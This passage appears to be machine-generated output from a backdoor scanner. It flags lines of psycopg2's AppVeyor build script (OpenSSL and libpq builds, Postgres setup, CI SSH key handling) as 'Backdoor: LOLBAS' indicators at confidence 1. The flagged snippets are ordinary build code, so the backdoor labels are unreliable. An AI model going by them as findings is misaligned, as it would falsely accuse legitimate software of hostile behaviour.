                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 3,
                  "endLine": 38,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    opt = parse_cmdline()\n    logger.setLevel(opt.loglevel)\n\n    cmd = globals()[STEP_PREFIX + opt.step]\n    cmd()\n\n\n",
                    "rendered": {
                      "text": "    opt = parse_cmdline()\n    logger.setLevel(opt.loglevel)\n\n    cmd = globals()[STEP_PREFIX + opt.step]\n    cmd()\n\n\n",
                      "markdown": "`    opt = parse_cmdline()\n    logger.setLevel(opt.loglevel)\n\n    cmd = globals()[STEP_PREFIX + opt.step]\n    cmd()\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 778,
                  "startColumn": 43,
                  "endLine": 778,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\n    @property\n    def ssl_build_dir(self):\n        \"\"\"The directory where to build the openssl libraries for psycopg.\"\"\"\n        return self.cache_arch_dir / 'openssl'\n\n    @property\n",
                    "rendered": {
                      "text": "\n    @property\n    def ssl_build_dir(self):\n        \"\"\"The directory where to build the openssl libraries for psycopg.\"\"\"\n        return self.cache_arch_dir / 'openssl'\n\n    @property\n",
                      "markdown": "`\n    @property\n    def ssl_build_dir(self):\n        \"\"\"The directory where to build the openssl libraries for psycopg.\"\"\"\n        return self.cache_arch_dir / 'openssl'\n\n    @property\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 758,
                  "startColumn": 40,
                  "endLine": 758,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\n    @property\n    def appveyor_pg_dir(self):\n        \"\"\"The directory of the postgres service made available by Appveyor.\"\"\"\n        return Path(os.environ['POSTGRES_DIR'])\n\n    @property\n",
                    "rendered": {
                      "text": "\n    @property\n    def appveyor_pg_dir(self):\n        \"\"\"The directory of the postgres service made available by Appveyor.\"\"\"\n        return Path(os.environ['POSTGRES_DIR'])\n\n    @property\n",
                      "markdown": "`\n    @property\n    def appveyor_pg_dir(self):\n        \"\"\"The directory of the postgres service made available by Appveyor.\"\"\"\n        return Path(os.environ['POSTGRES_DIR'])\n\n    @property\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 650,
                  "startColumn": 52,
                  "endLine": 650,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\nclass Options:\n    \"\"\"\n    An object exposing the script configuration from env vars and command line.\n    \"\"\"\n\n    @property\n",
                    "rendered": {
                      "text": "\nclass Options:\n    \"\"\"\n    An object exposing the script configuration from env vars and command line.\n    \"\"\"\n\n    @property\n",
                      "markdown": "`\nclass Options:\n    \"\"\"\n    An object exposing the script configuration from env vars and command line.\n    \"\"\"\n\n    @property\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 650,
                  "startColumn": 26,
                  "endLine": 650,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\nclass Options:\n    \"\"\"\n    An object exposing the script configuration from env vars and command line.\n    \"\"\"\n\n    @property\n",
                    "rendered": {
                      "text": "\nclass Options:\n    \"\"\"\n    An object exposing the script configuration from env vars and command line.\n    \"\"\"\n\n    @property\n",
                      "markdown": "`\nclass Options:\n    \"\"\"\n    An object exposing the script configuration from env vars and command line.\n    \"\"\"\n\n    @property\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 645,
                  "startColumn": 30,
                  "endLine": 645,
                  "endColumn": 36,
                  "snippet": {
                    "text": "            if os.path.isfile(fn):\n                return fn\n\n    raise Exception(f\"couldn't find program on path: {name}\")\n\n\nclass Options:\n",
                    "rendered": {
                      "text": "            if os.path.isfile(fn):\n                return fn\n\n    raise Exception(f\"couldn't find program on path: {name}\")\n\n\nclass Options:\n",
                      "markdown": "`            if os.path.isfile(fn):\n                return fn\n\n    raise Exception(f\"couldn't find program on path: {name}\")\n\n\nclass Options:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 614,
                  "startColumn": 26,
                  "endLine": 614,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\ndef out_python(args, **kwargs):\n    \"\"\"\n    Return the output of a script run in the target Python.\n    \"\"\"\n    return out_command([opt.py_exe] + args, **kwargs)\n\n",
                    "rendered": {
                      "text": "\ndef out_python(args, **kwargs):\n    \"\"\"\n    Return the output of a script run in the target Python.\n    \"\"\"\n    return out_command([opt.py_exe] + args, **kwargs)\n\n",
                      "markdown": "`\ndef out_python(args, **kwargs):\n    \"\"\"\n    Return the output of a script run in the target Python.\n    \"\"\"\n    return out_command([opt.py_exe] + args, **kwargs)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 607,
                  "startColumn": 9,
                  "endLine": 607,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\ndef run_python(args, **kwargs):\n    \"\"\"\n    Run a script in the target Python.\n    \"\"\"\n    return run_command([opt.py_exe] + args, **kwargs)\n\n",
                    "rendered": {
                      "text": "\ndef run_python(args, **kwargs):\n    \"\"\"\n    Run a script in the target Python.\n    \"\"\"\n    return run_command([opt.py_exe] + args, **kwargs)\n\n",
                      "markdown": "`\ndef run_python(args, **kwargs):\n    \"\"\"\n    Run a script in the target Python.\n    \"\"\"\n    return run_command([opt.py_exe] + args, **kwargs)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 569,
                  "startColumn": 7,
                  "endLine": 569,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\n        m = list(re.finditer(b'^{', out, re.MULTILINE))[-1]\n        out = out[m.start() :]\n        env = json.loads(out)\n        for k, v in env.items():\n            if os.environ.get(k) != v:\n                setenv(k, v)\n",
                    "rendered": {
                      "text": "\n        m = list(re.finditer(b'^{', out, re.MULTILINE))[-1]\n        out = out[m.start() :]\n        env = json.loads(out)\n        for k, v in env.items():\n            if os.environ.get(k) != v:\n                setenv(k, v)\n",
                      "markdown": "`\n        m = list(re.finditer(b'^{', out, re.MULTILINE))[-1]\n        out = out[m.start() :]\n        env = json.loads(out)\n        for k, v in env.items():\n            if os.environ.get(k) != v:\n                setenv(k, v)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 560,
                  "startColumn": 45,
                  "endLine": 560,
                  "endColumn": 50,
                  "snippet": {
                    "text": "\n    try:\n        out = out_command(fn)\n        # be vewwy vewwy caweful to print the env var as it might contain\n        # secwet things like your pwecious pwivate key.\n        # logger.debug(\"output of command:\\n\\n%s\", out.decode('utf8', 'replace'))\n\n",
                    "rendered": {
                      "text": "\n    try:\n        out = out_command(fn)\n        # be vewwy vewwy caweful to print the env var as it might contain\n        # secwet things like your pwecious pwivate key.\n        # logger.debug(\"output of command:\\n\\n%s\", out.decode('utf8', 'replace'))\n\n",
                      "markdown": "`\n    try:\n        out = out_command(fn)\n        # be vewwy vewwy caweful to print the env var as it might contain\n        # secwet things like your pwecious pwivate key.\n        # logger.debug(\"output of command:\\n\\n%s\", out.decode('utf8', 'replace'))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 469,
                  "startColumn": 51,
                  "endLine": 470,
                  "snippet": {
                    "text": "\"\"\"\n        )\n\n    # Make a directory to please MinGW's version of ssh\n    ensure_dir(r\"C:\\MinGW\\msys\\1.0\\home\\appveyor\\.ssh\")\n\n    return True\n\n",
                    "rendered": {
                      "text": "\"\"\"\n        )\n\n    # Make a directory to please MinGW's version of ssh\n    ensure_dir(r\"C:\\MinGW\\msys\\1.0\\home\\appveyor\\.ssh\")\n\n    return True\n\n",
                      "markdown": "`\"\"\"\n        )\n\n    # Make a directory to please MinGW's version of ssh\n    ensure_dir(r\"C:\\MinGW\\msys\\1.0\\home\\appveyor\\.ssh\")\n\n    return True\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 458,
                  "startColumn": 11,
                  "endLine": 458,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        logger.warn(\"skipping artifact upload: no remote key\")\n        return False\n\n    # Write SSH Private Key file from environment variable\n    pkey = pkey.replace(' ', '\\n')\n    with (opt.clone_dir / 'data/id_rsa-psycopg-upload').open('w') as f:\n        f.write(\n",
                    "rendered": {
                      "text": "        logger.warn(\"skipping artifact upload: no remote key\")\n        return False\n\n    # Write SSH Private Key file from environment variable\n    pkey = pkey.replace(' ', '\\n')\n    with (opt.clone_dir / 'data/id_rsa-psycopg-upload').open('w') as f:\n        f.write(\n",
                      "markdown": "`        logger.warn(\"skipping artifact upload: no remote key\")\n        return False\n\n    # Write SSH Private Key file from environment variable\n    pkey = pkey.replace(' ', '\\n')\n    with (opt.clone_dir / 'data/id_rsa-psycopg-upload').open('w') as f:\n        f.write(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 443,
                  "startColumn": 13,
                  "endLine": 443,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\ndef setup_ssh():\n    \"\"\"\n    Configure ssh to upload built packages where they can be retrieved.\n\n    Return False if can't configure and upload shoould be skipped.\n    \"\"\"\n",
                    "rendered": {
                      "text": "\ndef setup_ssh():\n    \"\"\"\n    Configure ssh to upload built packages where they can be retrieved.\n\n    Return False if can't configure and upload shoould be skipped.\n    \"\"\"\n",
                      "markdown": "`\ndef setup_ssh():\n    \"\"\"\n    Configure ssh to upload built packages where they can be retrieved.\n\n    Return False if can't configure and upload shoould be skipped.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 407,
                  "startColumn": 58,
                  "endLine": 407,
                  "endColumn": 67,
                  "snippet": {
                    "text": "\n\ndef run_test_suite():\n    # Remove this var, which would make badly a configured OpenSSL 1.1 work\n    os.environ.pop('OPENSSL_CONF', None)\n\n    # Run the unit test\n",
                    "rendered": {
                      "text": "\n\ndef run_test_suite():\n    # Remove this var, which would make badly a configured OpenSSL 1.1 work\n    os.environ.pop('OPENSSL_CONF', None)\n\n    # Run the unit test\n",
                      "markdown": "`\n\ndef run_test_suite():\n    # Remove this var, which would make badly a configured OpenSSL 1.1 work\n    os.environ.pop('OPENSSL_CONF', None)\n\n    # Run the unit test\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 265,
                  "startColumn": 55,
                  "endLine": 265,
                  "endColumn": 60,
                  "snippet": {
                    "text": "    )\n\n    for lib in ('libpgport', 'libpgcommon', 'libpq'):\n        copy_file(pgbuild / f'Release/{lib}/{lib}.lib', top / 'lib')\n\n    # Prepare local include directory for building from\n    for dir in ('win32', 'win32_msvc'):\n",
                    "rendered": {
                      "text": "    )\n\n    for lib in ('libpgport', 'libpgcommon', 'libpq'):\n        copy_file(pgbuild / f'Release/{lib}/{lib}.lib', top / 'lib')\n\n    # Prepare local include directory for building from\n    for dir in ('win32', 'win32_msvc'):\n",
                      "markdown": "`    )\n\n    for lib in ('libpgport', 'libpgcommon', 'libpq'):\n        copy_file(pgbuild / f'Release/{lib}/{lib}.lib', top / 'lib')\n\n    # Prepare local include directory for building from\n    for dir in ('win32', 'win32_msvc'):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 203,
                  "startColumn": 3,
                  "endLine": 203,
                  "endColumn": 8,
                  "snippet": {
                    "text": "\n\ndef build_libpq():\n    top = opt.pg_build_dir\n    if (top / 'lib' / 'libpq.lib').exists():\n        return\n\n",
                    "rendered": {
                      "text": "\n\ndef build_libpq():\n    top = opt.pg_build_dir\n    if (top / 'lib' / 'libpq.lib').exists():\n        return\n\n",
                      "markdown": "`\n\ndef build_libpq():\n    top = opt.pg_build_dir\n    if (top / 'lib' / 'libpq.lib').exists():\n        return\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 176,
                  "startColumn": 14,
                  "endLine": 176,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\n    ver = os.environ['OPENSSL_VERSION']\n\n    # Download OpenSSL source\n    zipname = f'OpenSSL_{ver}.zip'\n    zipfile = opt.cache_dir / zipname\n    if not zipfile.exists():\n",
                    "rendered": {
                      "text": "\n    ver = os.environ['OPENSSL_VERSION']\n\n    # Download OpenSSL source\n    zipname = f'OpenSSL_{ver}.zip'\n    zipfile = opt.cache_dir / zipname\n    if not zipfile.exists():\n",
                      "markdown": "`\n    ver = os.environ['OPENSSL_VERSION']\n\n    # Download OpenSSL source\n    zipname = f'OpenSSL_{ver}.zip'\n    zipfile = opt.cache_dir / zipname\n    if not zipfile.exists():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 165,
                  "startColumn": 11,
                  "endLine": 165,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    ensure_dir(top / 'include' / 'openssl')\n    ensure_dir(top / 'lib')\n\n    # Setup OpenSSL Environment Variables based on processor architecture\n    if opt.arch_32:\n        target = 'VC-WIN32'\n        setenv('VCVARS_PLATFORM', 'x86')\n",
                    "rendered": {
                      "text": "    ensure_dir(top / 'include' / 'openssl')\n    ensure_dir(top / 'lib')\n\n    # Setup OpenSSL Environment Variables based on processor architecture\n    if opt.arch_32:\n        target = 'VC-WIN32'\n        setenv('VCVARS_PLATFORM', 'x86')\n",
                      "markdown": "`    ensure_dir(top / 'include' / 'openssl')\n    ensure_dir(top / 'lib')\n\n    # Setup OpenSSL Environment Variables based on processor architecture\n    if opt.arch_32:\n        target = 'VC-WIN32'\n        setenv('VCVARS_PLATFORM', 'x86')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 36,
                  "endLine": 161,
                  "endColumn": 45,
                  "snippet": {
                    "text": "\n    logger.info(\"Building OpenSSL\")\n\n    # Setup directories for building OpenSSL libraries\n    ensure_dir(top / 'include' / 'openssl')\n    ensure_dir(top / 'lib')\n\n",
                    "rendered": {
                      "text": "\n    logger.info(\"Building OpenSSL\")\n\n    # Setup directories for building OpenSSL libraries\n    ensure_dir(top / 'include' / 'openssl')\n    ensure_dir(top / 'lib')\n\n",
                      "markdown": "`\n    logger.info(\"Building OpenSSL\")\n\n    # Setup directories for building OpenSSL libraries\n    ensure_dir(top / 'include' / 'openssl')\n    ensure_dir(top / 'lib')\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 155,
                  "startColumn": 3,
                  "endLine": 155,
                  "endColumn": 8,
                  "snippet": {
                    "text": "\n\ndef build_openssl():\n    top = opt.ssl_build_dir\n    if (top / 'lib' / 'libssl.lib').exists():\n        return\n\n",
                    "rendered": {
                      "text": "\n\ndef build_openssl():\n    top = opt.ssl_build_dir\n    if (top / 'lib' / 'libssl.lib').exists():\n        return\n\n",
                      "markdown": "`\n\ndef build_openssl():\n    top = opt.ssl_build_dir\n    if (top / 'lib' / 'libssl.lib').exists():\n        return\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 140,
                  "startColumn": 3,
                  "endLine": 140,
                  "endColumn": 12,
                  "snippet": {
                    "text": "def run_openssl(args):\n    \"\"\"Run the appveyor-installed openssl with some args.\"\"\"\n    # https://www.appveyor.com/docs/windows-images-software/\n    openssl = Path(r\"C:\\OpenSSL-v111-Win64\") / 'bin' / 'openssl'\n    return run_command([openssl] + args)\n\n\n",
                    "rendered": {
                      "text": "def run_openssl(args):\n    \"\"\"Run the appveyor-installed openssl with some args.\"\"\"\n    # https://www.appveyor.com/docs/windows-images-software/\n    openssl = Path(r\"C:\\OpenSSL-v111-Win64\") / 'bin' / 'openssl'\n    return run_command([openssl] + args)\n\n\n",
                      "markdown": "`def run_openssl(args):\n    \"\"\"Run the appveyor-installed openssl with some args.\"\"\"\n    # https://www.appveyor.com/docs/windows-images-software/\n    openssl = Path(r\"C:\\OpenSSL-v111-Win64\") / 'bin' / 'openssl'\n    return run_command([openssl] + args)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 138,
                  "startColumn": 33,
                  "endLine": 138,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n\ndef run_openssl(args):\n    \"\"\"Run the appveyor-installed openssl with some args.\"\"\"\n    # https://www.appveyor.com/docs/windows-images-software/\n    openssl = Path(r\"C:\\OpenSSL-v111-Win64\") / 'bin' / 'openssl'\n    return run_command([openssl] + args)\n",
                    "rendered": {
                      "text": "\n\ndef run_openssl(args):\n    \"\"\"Run the appveyor-installed openssl with some args.\"\"\"\n    # https://www.appveyor.com/docs/windows-images-software/\n    openssl = Path(r\"C:\\OpenSSL-v111-Win64\") / 'bin' / 'openssl'\n    return run_command([openssl] + args)\n",
                      "markdown": "`\n\ndef run_openssl(args):\n    \"\"\"Run the appveyor-installed openssl with some args.\"\"\"\n    # https://www.appveyor.com/docs/windows-images-software/\n    openssl = Path(r\"C:\\OpenSSL-v111-Win64\") / 'bin' / 'openssl'\n    return run_command([openssl] + args)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 107,
                  "startColumn": 12,
                  "endLine": 107,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        print(\"max_prepared_transactions = 10\", file=f)\n        print(\"ssl = on\", file=f)\n\n    # Create openssl certificate to allow ssl connection\n    cwd = os.getcwd()\n    os.chdir(opt.pg_data_dir)\n    run_openssl(\n",
                    "rendered": {
                      "text": "        print(\"max_prepared_transactions = 10\", file=f)\n        print(\"ssl = on\", file=f)\n\n    # Create openssl certificate to allow ssl connection\n    cwd = os.getcwd()\n    os.chdir(opt.pg_data_dir)\n    run_openssl(\n",
                      "markdown": "`        print(\"max_prepared_transactions = 10\", file=f)\n        print(\"ssl = on\", file=f)\n\n    # Create openssl certificate to allow ssl connection\n    cwd = os.getcwd()\n    os.chdir(opt.pg_data_dir)\n    run_openssl(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 99,
                  "startColumn": 39,
                  "endLine": 99,
                  "endColumn": 48,
                  "snippet": {
                    "text": "\ndef configure_postgres():\n    \"\"\"\n    Set up PostgreSQL config before the service starts.\n    \"\"\"\n    logger.info(\"Configuring Postgres\")\n    with (opt.pg_data_dir / 'postgresql.conf').open('a') as f:\n",
                    "rendered": {
                      "text": "\ndef configure_postgres():\n    \"\"\"\n    Set up PostgreSQL config before the service starts.\n    \"\"\"\n    logger.info(\"Configuring Postgres\")\n    with (opt.pg_data_dir / 'postgresql.conf').open('a') as f:\n",
                      "markdown": "`\ndef configure_postgres():\n    \"\"\"\n    Set up PostgreSQL config before the service starts.\n    \"\"\"\n    logger.info(\"Configuring Postgres\")\n    with (opt.pg_data_dir / 'postgresql.conf').open('a') as f:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/appveyor.py"
                },
                "region": {
                  "startLine": 81,
                  "startColumn": 40,
                  "endLine": 81,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    \"\"\"\n    Install or upgrade pip and build tools.\n    \"\"\"\n    run_python(\"-m pip install --upgrade pip setuptools wheel\".split())\n\n\ndef configure_sdk():\n",
                    "rendered": {
                      "text": "    \"\"\"\n    Install or upgrade pip and build tools.\n    \"\"\"\n    run_python(\"-m pip install --upgrade pip setuptools wheel\".split())\n\n\ndef configure_sdk():\n",
                      "markdown": "`    \"\"\"\n    Install or upgrade pip and build tools.\n    \"\"\"\n    run_python(\"-m pip install --upgrade pip setuptools wheel\".split())\n\n\ndef configure_sdk():\n`"
                    }
